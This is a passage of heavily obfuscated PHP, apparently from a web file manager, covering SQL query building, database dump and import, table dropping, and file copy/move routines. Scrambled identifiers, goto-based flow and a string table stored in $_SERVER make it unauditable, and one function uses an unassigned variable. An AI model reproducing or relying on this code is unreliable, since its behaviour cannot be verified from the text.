dŞõãğ‡ª; C£ì½»ôîá: $f˜õË„µ— = isset($b¹Ü·—£ğ[$b‡‚ß¶†®[337]]) ? $b¹Ü·—£ğ[$b‡‚ß¶†®[337]] : !1; if ($f˜õË„µ—) { $a¹İÅ‰÷™ö = is_string($f˜õË„µ—[$b‡‚ß¶†®[89]]) ? $f˜õË„µ—[$b‡‚ß¶†®[89]] : $b‡‚ß¶†®[957] . md5($aôÒÏÒë); $eçÜ‚ï½Ù = think_cache($a¹İÅ‰÷™ö, $b‡‚ß¶†®[33], $f˜õË„µ—); if (!1 !== $eçÜ‚ï½Ù) { return $eçÜ‚ï½Ù; } } $B¼Æ¥È¿„Í = $this->query($aôÒÏÒë, $this->parseBind(!empty($b¹Ü·—£ğ[$b‡‚ß¶†®[273]]) ? $b¹Ü·—£ğ[$b‡‚ß¶†®[273]] : array())); goto cä¶ù†šŒÔ; cä¶ù†šŒÔ: if ($f˜õË„µ— && !1 !== $B¼Æ¥È¿„Í) { think_cache($a¹İÅ‰÷™ö, $B¼Æ¥È¿„Í, $f˜õË„µ—); } return $B¼Æ¥È¿„Í; goto D°—ÅÀõŸ¾; dŞõãğ‡ª: $b‡‚ß¶†® =& $_SERVER[‚Ğ°–—î]; $this->model = $b¹Ü·—£ğ[$b‡‚ß¶†®[269]]; $aôÒÏÒë = $this->buildSelectSql($b¹Ü·—£ğ); goto C£ì½»ôîá; D°—ÅÀõŸ¾: } public function buildSelectSql($bÖ†ÜÑÛ  = array()) { goto BÓÛÖ¼ŠÃ; Bà¨¯Ë°•‘: $B‘ù§¢¡Œ = $this->parseSql($this->selectSql, $bÖ†ÜÑÛ ); $B‘ù§¢¡Œ .= $this->parseLock(isset($bÖ†ÜÑÛ [$aæ¡õÒã‰¾[771]]) ? $bÖ†ÜÑÛ [$aæ¡õÒã‰¾[771]] : !1); if (isset($FÛ†¶²ã‰Ã)) { think_cache($FÛ†¶²ã‰Ã, $B‘ù§¢¡Œ); } goto Fïà—‹Çßî; BÓÛÖ¼ŠÃ: $aæ¡õÒã‰¾ =& $_SERVER[‚Ğ°–—î]; if (isset($bÖ†ÜÑÛ [$aæ¡õÒã‰¾[340]])) { if (strpos($bÖ†ÜÑÛ [$aæ¡õÒã‰¾[340]], $aæ¡õÒã‰¾[47])) { list($a×ñŞİ™óŠ, $b¬Ğáç©) = explode($aæ¡õÒã‰¾[47], $bÖ†ÜÑÛ [$aæ¡õÒã‰¾[340]]); } else { $a×ñŞİ™óŠ = $bÖ†ÜÑÛ [$aæ¡õÒã‰¾[340]]; } $a×ñŞİ™óŠ = $a×ñŞİ™óŠ ? $a×ñŞİ™óŠ : 1; $b¬Ğáç© = isset($b¬Ğáç©) ? $b¬Ğáç© : (is_numeric($bÖ†ÜÑÛ [$aæ¡õÒã‰¾[280]]) ? $bÖ†ÜÑÛ [$aæ¡õÒã‰¾[280]] : 20); $Cª¹Â„«—Š = $b¬Ğáç© * ((int) $a×ñŞİ™óŠ - 1); $bÖ†ÜÑÛ [$aæ¡õÒã‰¾[280]] = $Cª¹Â„«—Š . $aæ¡õÒã‰¾[47] . $b¬Ğáç©; } if (think_config($aæ¡õÒã‰¾[958])) { $FÛ†¶²ã‰Ã = $aæ¡õÒã‰¾[959] . md5(serialize($bÖ†ÜÑÛ )); $AÑ°×Æ®î‰ = think_cache($FÛ†¶²ã‰Ã); if ($AÑ°×Æ®î‰) { return $AÑ°×Æ®î‰; } } goto Bà¨¯Ë°•‘; Fïà—‹Çßî: return $B‘ù§¢¡Œ; goto EßÔÙøÃåâ; EßÔÙøÃåâ: } public function parseSql($A÷¿„´Î—, $C‡½ø·×‘œ = array()) { $BŸƒ‹õ‘èé =& $_SERVER[‚Ğ°–—î]; $A÷¿„´Î— = str_replace(array($BŸƒ‹õ‘èé[960], $BŸƒ‹õ‘èé[961], $BŸƒ‹õ‘èé[962], $BŸƒ‹õ‘èé[963], $BŸƒ‹õ‘èé[964], $BŸƒ‹õ‘èé[965], $BŸƒ‹õ‘èé[966], $BŸƒ‹õ‘èé[967], $BŸƒ‹õ‘èé[968], $BŸƒ‹õ‘èé[969], $BŸƒ‹õ‘èé[970]), array($this->parseTable("{$C‡½ø·×‘œ[$BŸƒ‹õ‘èé[267]]}"), $this->parseDistinct(isset($C‡½ø·×‘œ[$BŸƒ‹õ‘èé[971]]) ? $C‡½ø·×‘œ[$BŸƒ‹õ‘èé[971]] : !1), $this->parseField(!empty($C‡½ø·×‘œ[$BŸƒ‹õ‘èé[261]]) ? $C‡½ø·×‘œ[$BŸƒ‹õ‘èé[261]] : $BŸƒ‹õ‘èé[176]), $this->parseJoin(!empty($C‡½ø·×‘œ[$BŸƒ‹õ‘èé[270]]) ? $C‡½ø·×‘œ[$BŸƒ‹õ‘èé[270]] : $BŸƒ‹õ‘èé[33]), $this->parseWhere(!empty($C‡½ø·×‘œ[$BŸƒ‹õ‘èé[263]]) ? $C‡½ø·×‘œ[$BŸƒ‹õ‘èé[263]] : $BŸƒ‹õ‘èé[33]), $this->parseGroup(!empty($C‡½ø·×‘œ[$BŸƒ‹õ‘èé[972]]) ? $C‡½ø·×‘œ[$BŸƒ‹õ‘èé[972]] : $BŸƒ‹õ‘èé[33]), $this->parseHaving(!empty($C‡½ø·×‘œ[$BŸƒ‹õ‘èé[973]]) ? $C‡½ø·×‘œ[$BŸƒ‹õ‘èé[973]] : $BŸƒ‹õ‘èé[33]), $this->parseOrder(!empty($C‡½ø·×‘œ[$BŸƒ‹õ‘èé[350]]) ? $C‡½ø·×‘œ[$BŸƒ‹õ‘èé[350]] : $BŸƒ‹õ‘èé[33]), $this->parseLimit(!empty($C‡½ø·×‘œ[$BŸƒ‹õ‘èé[280]]) ? $C‡½ø·×‘œ[$BŸƒ‹õ‘èé[280]] : $BŸƒ‹õ‘èé[33]), $this->parseUnion(!empty($C‡½ø·×‘œ[$BŸƒ‹õ‘èé[335]]) ? $C‡½ø·×‘œ[$BŸƒ‹õ‘èé[335]] : $BŸƒ‹õ‘èé[33]), $this->parseComment(!empty($C‡½ø·×‘œ[$BŸƒ‹õ‘èé[341]]) ? $C‡½ø·×‘œ[$BŸƒ‹õ‘èé[341]] : $BŸƒ‹õ‘èé[33])), $A÷¿„´Î—); return $A÷¿„´Î—; } public function getLastSql($fªîš²Èå­ = '') { return $fªîš²Èå­ ? $this->modelSql[$fªîš²Èå­] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($a‚Œ¾™œË) { return addslashes($a‚Œ¾™œË); } public function setModel($e‡ôËÎ) { $this->model = $e‡ôËÎ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($A‚‹¤¼á·Æ, $C‰¸†Š¾ = '') { $this->database = $A‚‹¤¼á·Æ; $this->type = $C‰¸†Š¾; } public function model($B¤‚´Î©–¨ = '') { return new ModelBase($B¤‚´Î©–¨, $_SERVER[‚Ğ°–—î][33], $this->database); } public function db($a°—Ë‘÷‡ = false) { goto D¡Â‘“Ôì; dåë®·ê£è: $this->database = $d´ÂÄ·ˆä; $A‘¼‘á©÷ê->execute("\165\163\x65\40\140{$c¬àè‡¸ë}\140"); return $A‘¼‘á©÷ê; goto EÇœ—ƒÑ¿; DºÖº„æÒ: $c¬àè‡¸ë = $d´ÂÄ·ˆä[$Bí„’…šßï[886]]; $d´ÂÄ·ˆä[$Bí„’…šßï[886]] = $Bí„’…šßï[33]; if ($d´ÂÄ·ˆä[$Bí„’…šßï[722]] == $Bí„’…šßï[723]) { $dÁä¤©’Íğ = $d´ÂÄ·ˆä[$Bí„’…šßï[724]]; $d´ÂÄ·ˆä[$Bí„’…šßï[724]] = substr($dÁä¤©’Íğ, 0, strrpos($dÁä¤©’Íğ, $Bí„’…šßï[974])); } goto dõ°×¼ñõç; dõ°×¼ñõç: $this->database = $d´ÂÄ·ˆä; $A‘¼‘á©÷ê = $this->model()->db(); try { $Eã¹’çéö© = $A‘¼‘á©÷ê->execute("\x73\150\157\167\x20\144\141\164\141\x62\141\x73\x65\163\40\x6c\x69\x6b\x65\x20\47{$c¬àè‡¸ë}\x27"); } catch (Exception $BÀ­ŒÎã†) { } goto AÔ°ğÁ¶; D¡Â‘“Ôì: $Bí„’…šßï =& $_SERVER[‚Ğ°–—î]; $d´ÂÄ·ˆä = array_change_key_case($this->database); if ($this->type == $Bí„’…šßï[9] || !$a°—Ë‘÷‡) { return $this->model()->db(); } goto DºÖº„æÒ; AÔ°ğÁ¶: if (!$Eã¹’çéö©) { $A‘¼‘á©÷ê->execute("\143\162\145\x61\x74\x65\x20\x64\141\164\141\142\141\x73\x65\40\140{$c¬àè‡¸ë}\140"); } $d´ÂÄ·ˆä[$Bí„’…šßï[886]] = $c¬àè‡¸ë; if ($d´ÂÄ·ˆä[$Bí„’…šßï[722]] == $Bí„’…šßï[723]) { $d´ÂÄ·ˆä[$Bí„’…šßï[724]] .= $Bí„’…šßï[974] . $c¬àè‡¸ë; } goto dåë®·ê£è; EÇœ—ƒÑ¿: } public function createTable($DãÛ©§µÒ¶, $bëÊ»‘Ú¯ = null) { $cÚÎ×Äœ‚ =& $_SERVER[‚Ğ°–—î]; if (!IO::exist($DãÛ©§µÒ¶)) { show_json(LNG($cÚÎ×Äœ‚[975]), !1); } $AóÇ‘òßâ = sqlSplit(IO::getContent($DãÛ©§µÒ¶)); foreach ($AóÇ‘òßâ as $Eè¤Ìø™‰) { if ($bëÊ»‘Ú¯) { $CÇØ‘Â¤¥® = stripos($Eè¤Ìø™‰, $cÚÎ×Äœ‚[976]) === 0; if ($CÇØ‘Â¤¥®) { $bëÊ»‘Ú¯->task[$cÚÎ×Äœ‚[977]] += 1; } } $this->model()->db()->execute($Eè¤Ìø™‰); if ($bëÊ»‘Ú¯ && $CÇØ‘Â¤¥®) { preg_match($cÚÎ×Äœ‚[978], $Eè¤Ìø™‰, $dæ‘…ëËÖ); $bëÊ»‘Ú¯->task[$cÚÎ×Äœ‚[979]] = $dæ‘…ëËÖ[1]; $bëÊ»‘Ú¯->update(1); } } $this->taskToCache($bëÊ»‘Ú¯); } public function insertTable($DæŸ“â‚Šš, $CŠÆ¶Ì§Ÿ = null) { $Cİâ¶„ÅÅ™ =& $_SERVER[‚Ğ°–—î]; $B¥²“âƒÊæ = $this->model()->db(); $B‰ë«Ğ­‡Ë = $B®ñÔ¥‚ßÍ ? array($B®ñÔ¥‚ßÍ) : $B¥²“âƒÊæ->getTables(); foreach ($DæŸ“â‚Šš as $cÛòÈÈ) { $B®ñÔ¥‚ßÍ = basename($cÛòÈÈ, $Cİâ¶„ÅÅ™[717]); if (!in_array($B®ñÔ¥‚ßÍ, $B‰ë«Ğ­‡Ë)) { continue; } if ($CŠÆ¶Ì§Ÿ) { $CŠÆ¶Ì§Ÿ->task[$Cİâ¶„ÅÅ™[979]] = $B®ñÔ¥‚ßÍ; } if (get_filesize($cÛòÈÈ) == 0) { continue; } $DÏ…îê£×Ş = $this->sqlToDb($cÛòÈÈ, $CŠÆ¶Ì§Ÿ); if (!$DÏ…îê£×Ş) { show_json(LNG($Cİâ¶„ÅÅ™[980]) . "\x5b{$B®ñÔ¥‚ßÍ}\135", !1); } } $this->taskToCache($CŠÆ¶Ì§Ÿ); } public function sqlFromDb($d§ÖîÔ¦Ç‰, $Aä¿ÍÑËÅ, $E­—´ßæâÁ = null, $A¹§Åˆ„Ù = null) { goto A×ÅÔ¹Ğ²À; aÓ¿õ†‹¤Ï: fclose($e„¤–á®¦); return $cÇƒ™²âÚ; goto a«½Á©Æ; b¾‰œ¸ñ: $e³‹ƒ´ë» = 1; $CÃÏ±¨ô = 500; $e„¤–á®¦ = fopen($Aä¿ÍÑËÅ, $_SERVER[‚Ğ°–—î][981]); goto Eæº¬†­•; A×ÅÔ¹Ğ²À: if ($E­—´ßæâÁ) { $E­—´ßæâÁ->task[$_SERVER[‚Ğ°–—î][979]] = $d§ÖîÔ¦Ç‰; } $fİ¾°‘Š = $this->model($d§ÖîÔ¦Ç‰); $cÇƒ™²âÚ = 0; goto b¾‰œ¸ñ; Eæº¬†­•: $fĞÛÜËöê = $fİ¾°‘Š->getPk(); $EºŠ«á÷¶ = $fİ¾°‘Š->getDbFields(); do { $CÓƒŠ‚öÅ× = $fİ¾°‘Š->field($EºŠ«á÷¶)->order($fĞÛÜËöê . $_SERVER[‚Ğ°–—î][982])->selectPage($CÃÏ±¨ô, $e³‹ƒ´ë»); $e£ ‚µèÇ‘ = isset($CÓƒŠ‚öÅ×[$_SERVER[‚Ğ°–—î][351]][$_SERVER[‚Ğ°–—î][353]]) ? $CÓƒŠ‚öÅ×[$_SERVER[‚Ğ°–—î][351]][$_SERVER[‚Ğ°–—î][353]] : 0; $aƒ‹´Şµñ = !empty($CÓƒŠ‚öÅ×[$_SERVER[‚Ğ°–—î][354]]) ? $CÓƒŠ‚öÅ×[$_SERVER[‚Ğ°–—î][354]] : array(); if (!($Dºİéë‘¬… = count($aƒ‹´Şµñ))) { break; } $D áœ¶À³‚ = array(); foreach ($aƒ‹´Şµñ as $eËóÅ¢Ê¤) { if ($d§ÖîÔ¦Ç‰ == $_SERVER[‚Ğ°–—î][983] && $eËóÅ¢Ê¤[$_SERVER[‚Ğ°–—î][29]] == $_SERVER[‚Ğ°–—î][984]) { $F§Œª™çÅ¿ = json_decode($eËóÅ¢Ê¤[$_SERVER[‚Ğ°–—î][359]], !0); if ($F§Œª™çÅ¿[$_SERVER[‚Ğ°–—î][28]] == date($_SERVER[‚Ğ°–—î][689]) && !$F§Œª™çÅ¿[$_SERVER[‚Ğ°–—î][688]]) { continue; } } if ($A¹§Åˆ„Ù) { $eËóÅ¢Ê¤[$_SERVER[‚Ğ°–—î][75]] = "\173\151\x6f\72{$A¹§Åˆ„Ù}\x7d" . substr($eËóÅ¢Ê¤[$_SERVER[‚Ğ°–—î][75]], strlen("\173\x69\x6f\x3a{$eËóÅ¢Ê¤[$_SERVER[‚Ğ°–—î][743]]}\175")); $eËóÅ¢Ê¤[$_SERVER[‚Ğ°–—î][743]] = $A¹§Åˆ„Ù; } $D áœ¶À³‚[] = $_SERVER[‚Ğ°–—î][985] . $this->sqlEncode($eËóÅ¢Ê¤) . $_SERVER[‚Ğ°–—î][986]; } $a©°Ùºïó = "\111\x4e\x53\105\x52\124\40\x49\x4e\124\117\x20\140{$d§ÖîÔ¦Ç‰}\x60\40\50\140" . implode($_SERVER[‚Ğ°–—î][987], $EºŠ«á÷¶) . $_SERVER[‚Ğ°–—î][988]; fwrite($e„¤–á®¦, $a©°Ùºïó . implode($_SERVER[‚Ğ°–—î][989], $D áœ¶À³‚) . $_SERVER[‚Ğ°–—î][67] . PHP_EOL); $e³‹ƒ´ë»++; $cÇƒ™²âÚ += $Dºİéë‘¬…; if ($E­—´ßæâÁ) { $E­—´ßæâÁ->update($Dºİéë‘¬…); } } while ($e³‹ƒ´ë» <= $e£ ‚µèÇ‘); goto aÓ¿õ†‹¤Ï; a«½Á©Æ: } public function sqlToDb($D’Ï¿‚›, $a”¼³Éñ›ß = null) { goto a„é¾´¯Š‘; a„é¾´¯Š‘: $BÆóºÔÙñ¥ =& $_SERVER[‚Ğ°–—î]; $F”Ã­·¤› = $this->model()->db(); $føó½ÏŞïŠ = @fopen($D’Ï¿‚›, $BÆóºÔÙñ¥[990]); goto c†¿ğ¨†ğœ; fƒÖ¶åÕÁ»: $C¡òÏà°® = 500 + 1; while (!feof($føó½ÏŞïŠ)) { if ($a”¼³Éñ›ß && $dåª§ÏÓŠ¶ != 0) { $a”¼³Éñ›ß->task[$BÆóºÔÙñ¥[977]] += 1; } $dåª§ÏÓŠ¶++; $FƒøÛ¦Ø´ = trim(fgets($føó½ÏŞïŠ)); $a‚ƒÒÆƒ½ .= $BÆóºÔÙñ¥[50] . $this->sqlDecode($FƒøÛ¦Ø´, $this->type); if ($dåª§ÏÓŠ¶ == $C¡òÏà°®) { $a‚ƒÒÆƒ½ = rtrim(trim($a‚ƒÒÆƒ½), $BÆóºÔÙñ¥[67]); if (!$F”Ã­·¤›->execute($a‚ƒÒÆƒ½)) { return !1; } if ($a”¼³Éñ›ß) { $a”¼³Éñ›ß->update($dåª§ÏÓŠ¶ - 1); } $a‚ƒÒÆƒ½ = $BÆóºÔÙñ¥[33]; $dåª§ÏÓŠ¶ = 0; } } fclose($føó½ÏŞïŠ); goto cçĞˆ‚ÑŠ; c†¿ğ¨†ğœ: if (!$føó½ÏŞïŠ) { return !1; } $dåª§ÏÓŠ¶ = 0; $a‚ƒÒÆƒ½ = $BÆóºÔÙñ¥[33]; goto fƒÖ¶åÕÁ»; cçĞˆ‚ÑŠ: if (trim($a‚ƒÒÆƒ½)) { $a‚ƒÒÆƒ½ = rtrim(trim($a‚ƒÒÆƒ½), $BÆóºÔÙñ¥[67]); if (!$F”Ã­·¤›->execute($a‚ƒÒÆƒ½)) { return !1; } if ($a”¼³Éñ›ß) { $a”¼³Éñ›ß->update($dåª§ÏÓŠ¶ - 1); } } return !0; goto eÖƒ§Ş‰Á³; eÖƒ§Ş‰Á³: } public function dropTable($Bø’·‡õĞÆ = null) { $f‘ÚÄ˜ÉÁÒ = $this->model()->db(); $eñŒ„‘”ÍÉ = $Bø’·‡õĞÆ ? array($Bø’·‡õĞÆ) : $f‘ÚÄ˜ÉÁÒ->getTables(); if (!$eñŒ„‘”ÍÉ) { return; } foreach ($eñŒ„‘”ÍÉ as $Bø’·‡õĞÆ) { $f‘ÚÄ˜ÉÁÒ->execute("\x64\x72\x6f\x70\x20\x74\141\x62\154\x65\x20\151\146\x20\145\170\151\x73\164\163\40\140{$Bø’·‡õĞÆ}\140"); } } private function taskToCache($e¾¿”Ò×İË = null) { $B¹’œì½÷• =& $_SERVER[‚Ğ°–—î]; if (!$e¾¿”Ò×İË) { return; } $Fùó ®ÖŠó = array($B¹’œì½÷•[979] => $e¾¿”Ò×İË->task[$B¹’œì½÷•[979]], $B¹’œì½÷•[977] => $e¾¿”Ò×İË->task[$B¹’œì½÷•[977]], $B¹’œì½÷•[991] => $e¾¿”Ò×İË->task[$B¹’œì½÷•[991]]); if ($Fùó ®ÖŠó[$B¹’œì½÷•[977]] == $Fùó ®ÖŠó[$B¹’œì½÷•[991]]) { $Fùó ®ÖŠó[$B¹’œì½÷•[695]] = 1; } Cache::set($B¹’œì½÷•[992] . $e¾¿”Ò×İË->task[$B¹’œì½÷•[367]], $Fùó ®ÖŠó); $e¾¿”Ò×İË->end(); } private function sqlEncode($dâ…¼¶¢²å) { $eì™‰µ¨òÎ =& $_SERVER[‚Ğ°–—î]; $E‹¯‰·Ú‰  = array(); foreach ($dâ…¼¶¢²å as $CÂèËˆ—îì) { if (is_array($CÂèËˆ—îì)) { $CÂèËˆ—îì = json_encode_force($CÂèËˆ—îì); } $CÂèËˆ—îì = addslashes($CÂèËˆ—îì); $CÂèËˆ—îì = str_replace(array($eì™‰µ¨òÎ[993], $eì™‰µ¨òÎ[217]), array($eì™‰µ¨òÎ[994], $eì™‰µ¨òÎ[995]), $CÂèËˆ—îì); $E‹¯‰·Ú‰ [] = str_replace($eì™‰µ¨òÎ[55], $eì™‰µ¨òÎ[996], $CÂèËˆ—îì); } return $eì™‰µ¨òÎ[55] . implode($eì™‰µ¨òÎ[997], $E‹¯‰·Ú‰ ) . $eì™‰µ¨òÎ[55]; } private function sqlDecode($aØ‚å”å¬Ù, $DÑ˜½Ûëõ) { $d‘Óô¸Õ =& $_SERVER[‚Ğ°–—î]; $aØ‚å”å¬Ù = str_replace(array($d‘Óô¸Õ[994], $d‘Óô¸Õ[995]), array($d‘Óô¸Õ[993], $d‘Óô¸Õ[217]), $aØ‚å”å¬Ù); if ($DÑ˜½Ûëõ == $d‘Óô¸Õ[9]) { $aØ‚å”å¬Ù = stripslashes($aØ‚å”å¬Ù); } return $aØ‚å”å¬Ù; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($eÕ‹˜‘·öÓ, $Bíö…¬¸½°) { $dÉ¤È°‡¡ = self::driverMake($Bíö…¬¸½°[0]); if (method_exists($dÉ¤È°‡¡, $eÕ‹˜‘·öÓ)) { return @call_user_func_array(array($dÉ¤È°‡¡, $eÕ‹˜‘·öÓ), $Bíö…¬¸½°); } if (method_exists($dÉ¤È°‡¡, $_SERVER[‚Ğ°–—î][998])) { return @call_user_func_array(array($dÉ¤È°‡¡, $eÕ‹˜‘·öÓ), $Bíö…¬¸½°); } else { if (method_exists(self, $eÕ‹˜‘·öÓ)) { return @call_user_func_array(array(self, $eÕ‹˜‘·öÓ), $Bíö…¬¸½°); } else { call_user_func_array(array(parent, $eÕ‹˜‘·öÓ), $Bíö…¬¸½°); } } } public static function init($F’ ÊŠ°Ïô) { return self::driverMake($F’ ÊŠ°Ïô); } public static function copy($bïãŠˆ×Øç, $c¯£Æ—œ°ö, $a¾ÃÉ†ß­Ï = false, $B’ÓÁ†ïºì = false) { return self::copyMove($bïãŠˆ×Øç, $c¯£Æ—œ°ö, $a¾ÃÉ†ß­Ï, $_SERVER[‚Ğ°–—î][490], $B’ÓÁ†ïºì); } public static function move($F¡àà‰´å…, $Eé–•îî‘‚, $DÚ«‘¸êŞ» = false, $Bãó‹¸•Ü‰ = false) { return self::copyMove($F¡àà‰´å…, $Eé–•îî‘‚, $DÚ«‘¸êŞ», $_SERVER[‚Ğ°–—î][492], $Bãó‹¸•Ü‰); } public static function saveFile($B£Ö×´å‘À, $e¹ã‰Õ¦²Ü, $d³°¡íôá = true) { goto F­ä¡¥ÚĞ„; F­ä¡¥ÚĞ„: $DñÄÌÃè¹œ =& $_SERVER[‚Ğ°–—î]; $Bàëˆä = self::info($e¹ã‰Õ¦²Ü); $AŒ—ºë†Ò° = self::driverMake($B£Ö×´å‘À); goto F·­ìÉ·ÕŠ; cğ¾ŞÛÎÂÅ: $F‡Ê—Åµù = $bê‚Ğë÷ ¿->pathFather($e¹ã‰Õ¦²Ü); $f‡³ä«ƒ— = !0; if (!$d³°¡íôá && self::driverIsSame($AŒ—ºë†Ò°, $bê‚Ğë÷ ¿)) { $f‡³ä«ƒ— = !1; } goto BğåŠ›Â ã; BğåŠ›Â ã: $c¡¤‘¶Ç› = self::copyFile($AŒ—ºë†Ò°, $B£Ö×´å‘À, $bê‚Ğë÷ ¿, $F‡Ê—Åµù, $Bàëˆä[$DñÄÌÃè¹œ[28]], $f‡³ä«ƒ—); if ($B¢‚ĞÈøÖ) { $c¡¤‘¶Ç› = $B¢‚ĞÈøÖ->getPathOuter($c¡¤‘¶Ç›); } return $c¡¤‘¶Ç›; goto b—ºÖ¿½õŒ; F·­ìÉ·ÕŠ: $bê‚Ğë÷ ¿ = self::driverMake($e¹ã‰Õ¦²Ü); $B¢‚ĞÈøÖ = !1; if ($bê‚Ğë÷ ¿->pathParse[$DñÄÌÃè¹œ[999]]) { $fÑÏÄê¶Ã = $bê‚Ğë÷ ¿->pathParse[$DñÄÌÃè¹œ[999]]; $B¢‚ĞÈøÖ = $bê‚Ğë÷ ¿; $bê‚Ğë÷ ¿ = self::driverMake($fÑÏÄê¶Ã); } goto cğ¾ŞÛÎÂÅ; b—ºÖ¿½õŒ: } private static function copyMove($b¯‘ˆòšç, $dº‡ìÀ‚Ü†, $CğŞ–„¡Ò¸, $aŞÌ”ùë÷, $DĞøŠíôÂø = false) { goto DÙç¦‡×½ö; DÙç¦‡×½ö: $bĞÚùß„Å =& $_SERVER[‚Ğ°–—î]; if (!$b¯‘ˆòšç || $b¯‘ˆòšç == $bĞÚùß„Å[8] || !$dº‡ìÀ‚Ü†) { return !1; } ignore_timeout(); goto AÌäÂöĞ·î; bÓ§èĞéˆ: $D«¶ÚœÙÇ = $D»©®¸Ê¿->isFile($b¯‘ˆòšç); if (!$D«¶ÚœÙÇ && $FøÒÖ¸§Õ·->getType() == $bĞÚùß„Å[693] && $D»©®¸Ê¿->getType() == $bĞÚùß„Å[102]) { $féÇ­ß¡“¢ = $FøÒÖ¸§Õ·->copyFolderFromIO($D»©®¸Ê¿, $b¯‘ˆòšç, $dº‡ìÀ‚Ü†, $CğŞ–„¡Ò¸, $cô¢¦­Î¨, $DĞøŠíôÂø); } else { $féÇ­ß¡“¢ = self::copyPath($D»©®¸Ê¿, $b¯‘ˆòšç, $FøÒÖ¸§Õ·, $dº‡ìÀ‚Ü†, $CğŞ–„¡Ò¸, $cô¢¦­Î¨, $D«¶ÚœÙÇ, $DĞøŠíôÂø); } if ($féÇ­ß¡“¢ && $cô¢¦­Î¨) { $D»©®¸Ê¿->remove($b¯‘ˆòšç); } goto C¶á¡²Ñš¿; c®†”Àœªæ: $aóÉ‚— Âò = !1; if ($FøÒÖ¸§Õ·->pathParse[$bĞÚùß„Å[999]]) { $dº‡ìÀ‚Ü† = $FøÒÖ¸§Õ·->pathParse[$bĞÚùß„Å[999]]; $aóÉ‚— Âò = $FøÒÖ¸§Õ·; $FøÒÖ¸§Õ· = self::driverMake($dº‡ìÀ‚Ü†); } self::check($D»©®¸Ê¿, $b¯‘ˆòšç, $FøÒÖ¸§Õ·, $dº‡ìÀ‚Ü†); goto dÂœÍ®¼Å; dÂœÍ®¼Å: Hook::trigger($bĞÚùß„Å[72], $D»©®¸Ê¿, $b¯‘ˆòšç, $FøÒÖ¸§Õ·, $dº‡ìÀ‚Ü†); $dÔÀ§Á†ø = self::driverIsSame($D»©®¸Ê¿, $FøÒÖ¸§Õ·); if ($dÔÀ§Á†ø) { if ($aŞÌ”ùë÷ == $bĞÚùß„Å[492] && !method_exists($FøÒÖ¸§Õ·, $bĞÚùß„Å[1000]) && trim($dº‡ìÀ‚Ü†, $bĞÚùß„Å[8]) == trim($FøÒÖ¸§Õ·->pathFather($b¯‘ˆòšç), $bĞÚùß„Å[8])) { return $FøÒÖ¸§Õ·->getPathOuter($b¯‘ˆòšç); } if (method_exists($FøÒÖ¸§Õ·, $aŞÌ”ùë÷)) { return $FøÒÖ¸§Õ·->{$aŞÌ”ùë÷}($b¯‘ˆòšç, $dº‡ìÀ‚Ü†, $CğŞ–„¡Ò¸); } } goto bÓ§èĞéˆ; C¶á¡²Ñš¿: if ($aóÉ‚— Âò) { $féÇ­ß¡“¢ = $aóÉ‚— Âò->getPathOuter($féÇ­ß¡“¢); } return $féÇ­ß¡“¢; goto CÚ„±åùË’; AÌäÂöĞ·î: $D»©®¸Ê¿ = self::driverMake($b¯‘ˆòšç); $FøÒÖ¸§Õ· = self::driverMake($dº‡ìÀ‚Ü†); $cô¢¦­Î¨ = $aŞÌ”ùë÷ == $bĞÚùß„Å[492]; goto c®†”Àœªæ; CÚ„±åùË’: } private static function check($cˆ¯Ü²Ë•, $fåõÆ­õÌ½, $e„ÎŸÛ×´¿, &$EŒÖ·ãÁ²è) { $c±´åäÑ‡¥ =& $_SERVER[‚Ğ°–—î]; if (self::driverIsSame($cˆ¯Ü²Ë•, $e„ÎŸÛ×´¿) && $cˆ¯Ü²Ë•->isFolder($fåõÆ­õÌ½) && $cˆ¯Ü²Ë•->isParentOf($fåõÆ­õÌ½, $EŒÖ·ãÁ²è)) { show_json(LNG($c±´åäÑ‡¥[1001]), !1); } if (!$cˆ¯Ü²Ë•->exist($fåõÆ­õÌ½)) { show_json(LNG($c±´åäÑ‡¥[101]), !1); } } private static function copyPath($eãàï°Ûèä, $d¢¾²ñ¬ëÌ, $d—¿Ç½¯åÁ, $bÚ†¶ĞÎÈ, $aß”ë™‹, $EÁî–ù±øó, $D ƒÖ˜¡¿, $dÃœÛİÇŒÎ = false) { goto e¨³“¾ÏË; b¬Îõ¹¹Ë: if ($D ƒÖ˜¡¿) { return self::copyFile($eãàï°Ûèä, $d¢¾²ñ¬ëÌ, $d—¿Ç½¯åÁ, $bÚ†¶ĞÎÈ, $f…®Ó¢˜í·, $EÁî–ù±øó); } if ($aß”ë™‹ == REPEAT_RENAME_FOLDER) { $aß”ë™‹ = !1; } $c‡ÖÚ‘ˆ– = rtrim($bÚ†¶ĞÎÈ, $b°à»Ç›ô [8]) . $b°à»Ç›ô [8] . $f…®Ó¢˜í·; goto CÁ¡ç†¢Ì; CÁ¡ç†¢Ì: $A·„Ù³Õ¬ = $d—¿Ç½¯åÁ->mkdir($d—¿Ç½¯åÁ->getPath($c‡ÖÚ‘ˆ–)); $bÚ†¶ĞÎÈ = $d—¿Ç½¯åÁ->getPathInner($A·„Ù³Õ¬); $d˜éõ°• = $eãàï°Ûèä->listPath($d¢¾²ñ¬ëÌ, !0); goto a¾™›÷×¤; a¾™›÷×¤: $aÀºÇ×Ø’Œ = array_merge($d˜éõ°•[$b°à»Ç›ô [73]], $d˜éõ°•[$b°à»Ç›ô [74]]); foreach ($aÀºÇ×Ø’Œ as $D†Öî¥’…) { $d¨ë§Š’£® = $D†Öî¥’…[$b°à»Ç›ô [29]] == $b°à»Ç›ô [167]; $d¢¾²ñ¬ëÌ = $eãàï°Ûèä->getPathInner($D†Öî¥’…[$b°à»Ç›ô [75]]); $Bæ®Í­ÑÈ = self::copyPath($eãàï°Ûèä, $d¢¾²ñ¬ëÌ, $d—¿Ç½¯åÁ, $bÚ†¶ĞÎÈ, $aß”ë™‹, $EÁî–ù±øó, $d¨ë§Š’£®); if (!$Bæ®Í­ÑÈ) { write_log($b°à»Ç›ô [1002] . $d¢¾²ñ¬ëÌ . $b°à»Ç›ô [1003] . $bÚ†¶ĞÎÈ, $b°à»Ç›ô [1004]); } } return $A·„Ù³Õ¬; goto CÜº±ÁÑ·¢; e¨³“¾ÏË: $b°à»Ç›ô  =& $_SERVER[‚Ğ°–—î]; $f…®Ó¢˜í· = $dÃœÛİÇŒÎ ? $dÃœÛİÇŒÎ : 